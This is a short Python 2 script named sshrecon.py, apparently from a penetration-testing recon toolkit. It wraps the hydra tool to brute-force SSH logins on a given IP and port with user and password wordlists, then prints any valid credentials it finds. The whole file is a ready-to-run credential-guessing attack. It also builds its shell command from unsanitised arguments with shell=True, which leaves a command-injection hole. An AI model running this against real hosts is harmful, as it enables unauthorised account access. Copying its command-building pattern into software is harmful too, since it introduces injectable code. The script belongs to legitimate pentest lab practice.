#!/usr/bin/env python
import subprocess
import sys

if len(sys.argv) != 4:
    print "Usage: sshrecon.py <ip address> <port> <output file>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()
folder = sys.argv[3].strip()

print "INFO: Performing hydra ssh scan against " + ip_address 
HYDRA = "hydra -L wordlists/userlist -P wordlists/offsecpass -f -o {folder}{ip_address}_sshhydra.txt -u {ip_address} -s {port} ssh".format(ip_address = ip_address, port = port, folder = folder)
try:
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
	    print "[*] Valid ssh credentials found: " + result 
except:
    print "INFO: No valid ssh credentials found"
